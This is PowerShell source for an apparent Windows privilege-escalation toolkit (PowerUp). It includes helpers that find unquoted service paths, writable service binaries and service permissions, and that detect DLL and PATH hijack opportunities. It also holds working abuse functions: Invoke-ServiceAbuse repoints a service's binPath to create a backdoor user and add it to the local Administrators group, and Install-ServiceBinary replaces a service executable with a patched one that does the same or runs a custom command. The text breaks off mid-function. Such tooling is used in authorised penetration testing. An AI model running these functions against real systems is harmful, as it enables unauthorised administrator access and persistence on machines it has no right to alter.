<#
    PowerUp aims to be a clearinghouse of common Windows privilege escalation
    vectors that rely on misconfigurations. See README.md for more information.

    Author: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>


########################################################
#
# Helpers
#
########################################################

function Get-ModifiableFile {
<#
    .SYNOPSIS

        Helper to return any modifiable file that's a part of a passed string.
        
    .EXAMPLE

        PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile

        Return the paths "C:\Temp\blah.bat" or "C:\Temp\config.ini" if they are
        modifable by the current user context.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $Path
    )

    begin {
        # false positives
        $Excludes = @("MsMpEng.exe", "NisSrv.exe")

        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    }

    process {
        $CandidateFiles = @()

        # test for quote-enclosed args first, returning files that exist on the system
        $CandidateFiles += $Path.split("`"'") | Where-Object { $_ -and (Test-Path $_) }

        # now check for space-separated args, returning files that exist on the system
        $CandidateFiles += $Path.split() | Where-Object { $_ -and (Test-Path $_) }
        
        # see if we need to skip any excludes
        $CandidateFiles | Sort-Object -Unique | Where-Object {$_} | Where-Object {
            $Skip = $False
            ForEach($Exclude in $Excludes) {
                if($_ -match $Exclude) { $Skip = $True }
            }
            if(!$Skip) {$True}
        } | ForEach-Object {

            try {
                # expand any %VARS%
                $FilePath = [System.Environment]::ExpandEnvironmentVariables($_)
                
                # try to open the file for writing, immediately closing it
                $File = Get-Item -Path $FilePath -Force
                $Stream = $File.OpenWrite()
                $Null = $Stream.Close()
                $FilePath
            }
            catch {}
        }
    }

    end {
        $ErrorActionPreference = $OrigError
    }
}

function Test-ServiceDaclPermission {
<#
    .SYNOPSIS

        This function checks if the current user has specific DACL permissions 
        for a specific service with the aid of 'sc.exe sdshow'.

    .PARAMETER ServiceName

        The service name to verify the permissions against. Required.

    .PARAMETER Dacl

        The DACL permissions. Required.
  
    .EXAMPLE

        PS C:\> Test-ServiceDaclPermission -ServiceName VulnSVC -Dacl WPRPDC

        Return $True if the current user has Stop (WP), Start (RP),
        and ChangeConf (DC) service permissions for 'VulnSVC' otherwise return $False.

    .LINK

        https://support.microsoft.com/en-us/kb/914392
        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $ServiceName,

        [Parameter(Mandatory = $True)]
        [string]
        $Dacl
    )

    # check if sc.exe exists
    if (-not (Test-Path ("$env:SystemRoot\system32\sc.exe"))){ 
        Write-Warning "[!] Could not find $env:SystemRoot\system32\sc.exe"
        return $False
    }

    $ServiceAccessFlags = @{
          CC = 1
          DC = 2
          LC = 4
          SW = 8
          RP = 16
          WP = 32
          DT = 64
          LO = 128
          CR = 256
          SD = 65536
          RC = 131072
          WD = 262144
          WO = 524288
          GA = 268435456
          GX = 536870912
          GW = 1073741824
          GR = 2147483648
    }

    # query WMI for the service
    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
    
    # make sure we got a result back
    if (-not ($TargetService)){
        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
        return $False
    }

    try {
        # retrieve DACL from sc.exe
        $Result = sc.exe sdshow $TargetService.Name | where {$_}

        if ($Result -like "*OpenService FAILED*"){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $False
        }

        $SecurityDescriptors = New-Object System.Security.AccessControl.RawSecurityDescriptor($Result)

        # populate a list of group SIDs that the current user is a member of
        $Sids = whoami /groups /FO csv | ConvertFrom-Csv | select "SID" | ForEach-Object {$_.Sid}

        # add to the list the SID of the current user
        $Sids += [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value

        ForEach ($Sid in $Sids){
            ForEach ($Ace in $SecurityDescriptors.DiscretionaryAcl){   
            
                # check if the group/user SID is included in the ACE 
                if ($Sid -eq $Ace.SecurityIdentifier){
                    
                    # convert the AccessMask to a service DACL string
                    $DaclString = $($ServiceAccessFlags.Keys | Foreach-Object {
                        if (($ServiceAccessFlags[$_] -band $Ace.AccessMask) -eq $ServiceAccessFlags[$_]) {
                            $_
                        }
                    }) -join ""
                
                    # convert the input DACL to an array
                    $DaclArray = [array] ($Dacl -split '(.{2})' | Where-Object {$_})
                
                    # counter to check how many DACL permissions were found
                    $MatchedPermissions = 0
                
                    # check if each of the permissions exists
                    ForEach ($DaclPermission in $DaclArray){
                        if ($DaclString.Contains($DaclPermission.ToUpper())){
                            $MatchedPermissions += 1
                        }
                        else{
                            break
                        }
                    }
                    # found all permissions - success
                    if ($MatchedPermissions -eq $DaclArray.Count){
                        return $True
                    }
                }  
            }
        }
        return $False
    }
    catch{
        Write-Warning "Error: $_"
        return $False
    }
}

function Invoke-ServiceStart {
<#
    .SYNOPSIS

        Starts a specified service, first enabling the service if it was marked as disabled.

    .PARAMETER ServiceName

        The service name to start. Required.

    .EXAMPLE

        PS C:\> Invoke-ServiceStart -ServiceName VulnSVC

        Start the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
        
        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
            
        try {
            # enable the service if it was marked as disabled
            if ($TargetService.StartMode -eq "Disabled"){
                $r = Invoke-ServiceEnable -ServiceName "$($TargetService.Name)"
                if (-not $r){ 
                    return $False 
                }
            }

            # start the service
            Write-Verbose "Starting service '$($TargetService.Name)'"
            $Null = sc.exe start "$($TargetService.Name)"

            Start-Sleep -s .5
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceStop {
<#
    .SYNOPSIS

        Stops a specified service.

    .PARAMETER ServiceName

        The service name to stop. Required.
        
    .EXAMPLE

        PS C:\> Invoke-ServiceStop -ServiceName VulnSVC

        Stop the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }

        try {
            # stop the service
            Write-Verbose "Stopping service '$($TargetService.Name)'"
            $Result = sc.exe stop "$($TargetService.Name)"

            if ($Result -like "*Access is denied*"){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $False
            }
            elseif ($Result -like "*1051*") {
                # if we can't stop the service because other things depend on it
                Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
                return $False
            }

            Start-Sleep 1
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceEnable {
<#
    .SYNOPSIS

        Enables a specified service.

    .PARAMETER ServiceName

        The service name to enable. Required.
        
    .EXAMPLE

        PS C:\> Invoke-ServiceEnable -ServiceName VulnSVC

        Enables the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
        
        try {
            # enable the service
            Write-Verbose "Enabling service '$TargetService.Name'"
            $Null = sc.exe config "$($TargetService.Name)" start= demand
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceDisable {
<#
    .SYNOPSIS

        Disables a specified service.

    .PARAMETER ServiceName

        The service name to disable. Required.
    
    .EXAMPLE

        PS C:\> Invoke-ServiceDisable -ServiceName VulnSVC

        Disables the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )
    
    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
        
        try {
            # disable the service
            Write-Verbose "Disabling service '$TargetService.Name'"
            $Null = sc.exe config "$($TargetService.Name)" start= disabled
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


########################################################
#
# Service enumeration
#
########################################################

function Get-ServiceUnquoted {
<#
    .SYNOPSIS

        Returns the name and binary path for services with unquoted paths
        that also have a space in the name.
        
    .EXAMPLE

        PS C:\> $services = Get-ServiceUnquoted
        
        Get a set of potentially exploitable services.

    .LINK
      
        https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
#>

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | Where-Object {-not $_.pathname.StartsWith("`"")} | Where-Object {-not $_.pathname.StartsWith("'")} | Where-Object {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}
    
    if ($VulnServices) {
        ForEach ($Service in $VulnServices){
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'ServiceName' $Service.name
            $Out | Add-Member Noteproperty 'Path' $Service.pathname
            $Out | Add-Member Noteproperty 'StartName' $Service.startname
            $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -ServiceName '$($Service.name)' -Path <HijackPath>"
            $Out
        }
    }
}


function Get-ServiceFilePermission {
<#
    .SYNOPSIS

        This function finds all services where the current user can 
        write to the associated binary or its arguments. 
        If the associated binary (or config file) is overwritten, 
        privileges may be able to be escalated.
        
    .EXAMPLE

        PS C:\> Get-ServiceFilePermission

        Get a set of potentially exploitable service binares/config files.
#>
    
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiableFile | ForEach-Object {
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -ServiceName '$ServiceName'"
            $Out
        }
    }
}


function Get-ServicePermission {
<#
    .SYNOPSIS

        This function enumerates all available services and tries to
        open the service for modification, returning the service object
        if the process doesn't failed.
    
    .EXAMPLE

        PS C:\> Get-ServicePermission

        Get a set of potentially exploitable services.
#>
    
    # check if sc.exe exists
    if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))) { 
        Write-Warning "[!] Could not find $Env:SystemRoot\System32\sc.exe"
        
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'ServiceName' 'Not Found'
        $Out | Add-Member Noteproperty 'Path' "$Env:SystemRoot\System32\sc.exe"
        $Out | Add-Member Noteproperty 'StartName' $Null
        $Out | Add-Member Noteproperty 'AbuseFunction' $Null
        $Out
    }

    $Services = Get-WmiObject -Class win32_service | Where-Object {$_}
    
    if ($Services) {
        ForEach ($Service in $Services){

            # try to change error control of a service to its existing value
            $Result = sc.exe config $($Service.Name) error= $($Service.ErrorControl)

            # means the change was successful
            if ($Result -contains "[SC] ChangeServiceConfig SUCCESS"){
                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
                $Out
            }
        }
    }
}


function Get-ServiceDetail {
<#
    .SYNOPSIS

        Returns detailed information about a specified service.

    .PARAMETER ServiceName

        The service name to query for. Required.

    .EXAMPLE

        PS C:\> Get-ServiceDetail -ServiceName VulnSVC

        Gets detailed information about the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_} | ForEach-Object {
            try {
                $_ | Format-List *
            }
            catch{
                Write-Warning "Error: $_"
                $null
            }            
        }
    }
}


########################################################
#
# Service abuse
#
########################################################

function Invoke-ServiceAbuse {
<#
    .SYNOPSIS

        This function stops a service, modifies it to create a user, starts
        the service, stops it, modifies it to add the user to the specified group,
        stops it, and then restores the original EXE path. It can also take a 
        custom -CMD argument to trigger a custom command instead of adding a user.
        
    .PARAMETER ServiceName

        The service name to manipulate. Required.

    .PARAMETER UserName

        The [domain\]username to add. If not given, it defaults to "john".
        Domain users are not created, only added to the specified localgroup.

    .PARAMETER Password

        The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER LocalGroup

        Local group name to add the user to (default of Administrators).
    
    .PARAMETER Command
    
        Custom local command to execute.

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC

        Abuses service 'VulnSVC' to add a localuser "john" with password 
        "Password123! to the  machine and local administrator group

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john"

        Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
        local adminisrtators group.

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"

        Abuses service 'VulnSVC' to add a localuser "backdoor" with password 
        "password" to the  machine and local "Power Users" group

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..."

        Abuses service 'VulnSVC' to execute a custom command.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    process {

        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
        $ServiceAbused = $Null

        # make sure we got a result back
        if ($TargetService) {

            $ServiceAbused = $TargetService.Name
            $UserAdded = $Null
            $PasswordAdded = $Null
            $GroupnameAdded = $Null

            try {
                # check if sc.exe exists
                if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))){ 
                    throw "Could not find $Env:SystemRoot\System32\sc.exe"
                }

                # try to enable the service it was disabled
                $RestoreDisabled = $False
                if ($TargetService.StartMode -eq "Disabled") {
                    Write-Verbose "Service '$ServiceName' disabled, enabling..."
                    if(-not $(Invoke-ServiceEnable -ServiceName $ServiceName)) {
                        throw "Error in enabling disabled service."
                    }
                    $RestoreDisabled = $True
                }

                # extract the original path and state so we can restore it later
                $OriginalPath = $TargetService.PathName
                $OriginalState = $TargetService.State
                Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
                Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"

                $Commands = @()

                if($Command) {
                    # only executing a custom command
                    $Commands += $Command
                }
                elseif($UserName.Contains("\")) {
                    # adding a domain user to the local group, no creation
                    $Commands += "net localgroup $LocalGroup $UserName /add"
                }
                else {
                    # creating a local user and adding to the local group
                    $Commands += "net user $UserName $Password /add"
                    $Commands += "net localgroup $LocalGroup $UserName /add"
                }

                foreach($Cmd in $Commands) {
                    if(-not $(Invoke-ServiceStop -ServiceName $TargetService.Name)) {
                        throw "Error in stopping service."
                    }

                    Write-Verbose "Executing command '$Cmd'"

                    $Result = sc.exe config $($TargetService.Name) binPath= $Cmd
                    if ($Result -contains "Access is denied."){
                        throw "Access to service $($TargetService.Name) denied"
                    }

                    $Null = Invoke-ServiceStart -ServiceName $TargetService.Name
                }
 
                # cleanup and restore the original binary path
                Write-Verbose "Restoring original path to service '$ServiceName'"
                $Null = sc.exe config $($TargetService.Name) binPath= $OriginalPath

                # try to restore the service to whatever state it was
                if($RestoreDisabled) {
                    Write-Verbose "Re-disabling service '$ServiceName'"
                    $Result = sc.exe config $($TargetService.Name) start= disabled
                }
                elseif($OriginalState -eq "Paused") {
                    Write-Verbose "Starting and then pausing service '$ServiceName'"
                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                    $Null = sc.exe pause $($TargetService.Name)
                }
                elseif($OriginalState -eq "Stopped") {
                    Write-Verbose "Leaving service '$ServiceName' in stopped state"
                }
                else {
                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                }
            }
            catch {
                Write-Warning "Error while modifying service '$ServiceName': $_"
                $Commands = @("Error while modifying service '$ServiceName': $_")
            }
        }

        else {
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Commands = "Not found"
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceAbused' $ServiceAbused
        $Out | Add-Member Noteproperty 'Command' $($Commands -join " && ")
        $Out
    }
}


function Write-ServiceBinary {
<#
    .SYNOPSIS

        Takes a precompiled C# service executable and binary patches in a 
        custom shell command or commands to add a local administrator.
        It then writes the binary out to the specified location.
        Domain users are only added to the specified LocalGroup.
        
    .PARAMETER ServiceName

        The service name the EXE will be running under. Required.

    .PARAMETER Path

        Path to write the binary out to, defaults to the local directory.

    .PARAMETER UserName

        The [DOMAIN\username] to add, defaults to 'john'.

    .PARAMETER Password

        The password to set for the added user, default to 'Password123!'.

    .PARAMETER LocalGroup

        Local group to add the user to, defaults to 'Administrators'.

    .PARAMETER Command

        A custom command to execute.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC

        Writes the service binary for VulnSVC that adds a local administrator
        to the local directory.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"

        Writes the service binary for VulnSVC that adds TESTLAB\john to the local
        administrators to the local directory.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!

        Writes the service binary for VulnSVC that adds a local administrator of
        name 'backdoor' with password 'Password123!' to the local directory.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -Command "net ..."

        Writes the service binary for VulnSVC that executes a local command
        to the local directory.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $ServicePath = "service.exe",

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    begin {
        # the raw unpatched service binary
        $B64Binary = ""
        [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)
    }

    process {
        if(-not $Command) {
            if($UserName.Contains("\")) {
                # adding a domain user to the local group, no creation
                $Command = "net localgroup $LocalGroup $UserName /add"
            }
            else {
                # creating a local user and adding to the local group
                $Command = "net user $UserName $Password /add && timeout /t 2 && net localgroup $LocalGroup $UserName /add"
            }
        }

        # get the unicode byte conversions of all arguments
        $Enc = [System.Text.Encoding]::Unicode
        $ServiceNameBytes = $Enc.GetBytes($ServiceName)
        $CommandBytes = $Enc.GetBytes($Command)

        # patch all values in to their appropriate locations
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) { 
            # service name offset = 2458
            $Binary[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) { 
            # cmd offset = 2535
            $Binary[$i+2535] = $CommandBytes[$i]
        }

        try {
            Set-Content -Value $Binary -Encoding Byte -Path $ServicePath -Force
        }
        catch {
            $Msg = "Error while writing to location '$ServicePath': $_"
            Write-Warning $Msg
            $Command = $Msg
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
        $Out | Add-Member Noteproperty 'Command' $Command
        $Out
    }
}


function Install-ServiceBinary {
<#
    .SYNOPSIS

        Users Write-ServiceBinary to write a C# service that creates a local UserName
        and adds it to specified LocalGroup or executes a custom command.
        Domain users are only added to the specified LocalGroup.

    .PARAMETER ServiceName

        The service name to manipulate. Required.

    .PARAMETER UserName

        The [DOMAIN\username] to add, defaults to 'john'.

    .PARAMETER Password

        The password to set for the added user, default to 'Password123!'.

    .PARAMETER LocalGroup

        Local group to add the user to, defaults to 'Administrators'.

    .PARAMETER Command

        A custom command to execute.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC

        Replaces the binary for VulnSVC with one that adds a local administrator
        to the local directory. Also backs up the original service binary.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"

        Replaces the binary for VulnSVC with one that adds TESTLAB\john to the local
        administrators to the local directory. Also backs up the original service binary.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!

        Replaces the binary for VulnSVC with one that adds a local administrator of
        name 'backdoor' with password 'Password123!' to the local directory.
        Also backs up the original service binary.

    .EXAMPLE

        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."

        Replaces the binary for VulnSVC with one that executes a local command
        to the local directory. Also backs up the original service binary.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService){
            try {

                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
                $BackupPath = $ServicePath + ".bak"

                Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
                try {
                    Move-Item -Path $ServicePath -Destination $BackupPath -Force
                }
                catch {
                    Write-Warning "[*] Original path '$ServicePath' for '$ServiceName' does not exist!"
                }

                $Arguments = @{
                    'ServiceName' = $ServiceName
                    'ServicePath' = $ServicePath
                    'UserName' = $UserName
                    'Password' = $Password
                    'LocalGroup' = $LocalGroup
                    'Command' = $Command
                }
                # splat the appropriate arguments to Write-ServiceBinary
                $Result = Write-ServiceBinary @Arguments
                $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Result
            }
            catch {
                Write-Warning "Error: $_"
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
                $Out | Add-Member Noteproperty 'Command' $_
                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Out
            }
        }
        else{
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
            $Out | Add-Member Noteproperty 'Command' "Not found"
            $Out | Add-Member Noteproperty 'BackupPath' $Null
            $Out
        }
    }
}


function Restore-ServiceBinary {
<#
    .SYNOPSIS

        Copies in the backup executable to the original binary path for a service.

    .PARAMETER ServiceName

        The service name to manipulate. Required.
  
    .PARAMETER BackupPath

        Optional manual path to the backup binary.
        
    .EXAMPLE

        PS C:\> Restore-ServiceBinary -ServiceName VulnSVC

        Restore the original binary for the service 'VulnSVC'
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $BackupPath
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService){
            try {

                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")

                if ($BackupPath -eq $null -or $BackupPath -eq ''){
                    $BackupPath = $ServicePath + ".bak"
                }

                Copy-Item -Path $BackupPath -Destination $ServicePath -Force
                Remove-Item -Path $BackupPath -Force

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Out
            }
            catch{
                Write-Warning "Error: $_"
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $_
                $Out | Add-Member Noteproperty 'BackupPath' $Null
                $Out
            }
        }
        else{
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
            $Out | Add-Member Noteproperty 'BackupPath' $Null
            $Out
        }
    }
}


########################################################
#
# .dll Hijacking
#
########################################################

function Find-DLLHijack {
<#
    .SYNOPSIS

        Checks all loaded modules for each process and returns locations 
        where a loaded module does not exist in the executable base path.

    .PARAMETER ExcludeWindows

        Exclude paths from C:\Windows\* instead of just C:\Windows\System32\*

    .PARAMETER ExcludeProgramFiles

        Exclude paths from C:\Program Files\* and C:\Program Files (x86)\* 

    .PARAMETER ExcludeOwned

        Exclude processes the current user owns. 

    .EXAMPLE

        PS C:\> Find-DLLHijack

        Finds all hijackable DLL locations.

    .EXAMPLE

        PS C:\> Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles

        Finds all hijackable DLL locations not in C:\Windows\* and
        not in C:\Program Files\* or C:\Program Files (x86)\*

    .EXAMPLE

        PS C:\> Find-DLLHijack -ExcludeOwned

        Finds .DLL hijacking opportunities for processes not owned by the
        current user.

    .LINK

        https://www.mandiant.com/blog/malware-persistence-windows-registry/
#>

    [CmdletBinding()]
    Param(
        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # the known DLL cache to exclude from our findings
    #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
    $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
    $KnownDLLs = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name) }) | Where-Object { $_.EndsWith(".dll") }

    # grab the current user
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    # get the owners for all processes
    $Owners = @{}
    Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$Owners[$_.handle] = $_.getowner().user}


    # iterate through all current processes that have a valid path
    ForEach ($Process in Get-Process | Where-Object {$_.Path}) {

        # get the base path for the process
        $BasePath = $Process.Path | Split-Path -Parent

        # get all the loaded modules for this process
        $LoadedModules = $Process.Modules

        # pull out the owner of this process
        $ProcessOwner = $Owners[$Process.id.tostring()]

        # check each loaded module
        ForEach ($Module in $LoadedModules){

            # create a basepath + loaded module
            $ModulePath = "$BasePath\$($module.ModuleName)"

            # if the new module path 
            if ((-not $ModulePath.Contains("C:\Windows\System32")) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                $Exclude = $False

                # check exclusion flags
                if ( $ExcludeWindows.IsPresent -and $ModulePath.Contains("C:\Windows") ){
                    $Exclude = $True
                }
                if ( $ExcludeProgramFiles.IsPresent -and $ModulePath.Contains("C:\Program Files") ){
                    $Exclude = $True
                }
                if ( $ExcludeOwned.IsPresent -and $CurrentUser.Contains($ProcessOwner) ){
                    $Exclude = $True
                }

                # output the process name and hijackable path if exclusion wasn't marked
                if (-not $Exclude){
                    $Out = New-Object PSObject 
                    $Out | Add-Member Noteproperty 'ProcessPath' $Process.Path
                    $Out | Add-Member Noteproperty 'Owner' $ProcessOwner
                    $Out | Add-Member Noteproperty 'HijackablePath' $ModulePath
                    $Out
                }
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


function Find-PathHijack {
<#
    .SYNOPSIS

        Checks if the current %PATH% has any directories that are 
        writeable by the current user.

    .EXAMPLE

        PS C:\> Find-PathHijack

        Finds all %PATH% .DLL hijacking opportunities.

    .LINK

        http://www.greyhathacker.net/?p=738
#>

    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Paths = (Get-Item Env:Path).value.split(';') | Where-Object {$_ -ne ""}

    ForEach ($Path in $Paths){

        $Path = $Path.Replace('"',"")
        if (-not $Path.EndsWith("\")){
            $Path = $Path + "\"
        }

        # reference - http://stackoverflow.com/questions/9735449/how-to-verify-whether-the-share-has-write-access
        $TestPath = Join-Path $Path ([IO.Path]::GetRandomFileName())

        # if the path doesn't exist, try to create the folder before testing it for write
        if(-not $(Test-Path -Path $Path)){
            try {
                # try to create the folder
                $Null = New-Item -ItemType directory -Path $Path
                echo $Null > $TestPath

                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'HijackablePath' $Path
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                $Out
            }
            catch {}
            finally {
                # remove the directory
